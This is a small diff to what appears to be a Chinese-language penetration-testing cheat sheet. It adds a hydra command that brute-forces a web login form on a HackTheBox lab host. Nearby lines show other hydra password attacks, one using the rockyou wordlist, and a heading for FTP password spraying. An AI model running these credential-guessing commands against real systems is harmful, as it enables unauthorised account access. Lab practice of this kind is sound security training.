@@ -145,6 +145,10 @@ sudo hydra -l "aaa" -P wordlist.txt
 sudo hydra -l "key" -P /usr/share/wordlists/rockyou.txt 10.10.10.7 http-form-post "/kzMb5nVYJw/index.php:key=^PASS^:invalid key"
 ```
 
+```bash
+hydra -C userspass streamio.htb https-post-form "/login.php:username=^USER^&password=^PASS^:F=failed" 
+```
+
 - FTP 密码喷射
 
 ```bash
